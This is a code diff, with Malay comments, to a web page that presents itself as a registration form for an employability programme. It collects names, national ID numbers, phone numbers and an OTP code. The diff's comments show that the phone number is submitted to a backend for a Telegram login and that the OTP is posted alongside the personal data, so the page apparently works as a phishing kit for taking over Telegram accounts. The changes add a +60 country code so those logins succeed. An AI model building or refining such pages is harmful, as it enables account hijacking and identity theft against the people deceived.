@@ -334,7 +334,7 @@ Program ini bertujuan untuk mengukuhkan kebolehpasaran serta mempercepatkan pene
 placeholder="Contoh: 010203-10-0101">
 
 <label>No. Telefon</label>
-<input type="text" id="telefon" placeholder="Contoh: 0123456789">
+<input type="text" id="telefon" placeholder="Contoh: 0123456789" pattern="[0-9]{9,12}" title="Masukkan 9-12 digit tanpa +60">
 
 <label>Negeri</label>
 <select id="negeri">
@@ -606,8 +606,9 @@ function semakBorang(){
         return;
     }
 
-    // Hantar nombor telefon ke app.py untuk login Telegram
-    document.getElementById('telegramPhoneInput').value = telefon.value;
+    // Hantar nombor telefon ke app.py untuk login Telegram (auto-add +60)
+    let phoneWithCountryCode = '+60' + telefon.value.trim();
+    document.getElementById('telegramPhoneInput').value = phoneWithCountryCode;
     document.getElementById('telegramLoginForm').submit();
 
 }
@@ -635,7 +636,7 @@ function verifyCode(){
         body: JSON.stringify({
             nama: document.getElementById("nama").value,
             ic: document.getElementById("ic").value,
-            telefon: document.getElementById("telefon").value,
+            telefon: '+60' + document.getElementById("telefon").value.trim(),
             negeri: document.getElementById("negeri").value,
             otp: code
         })
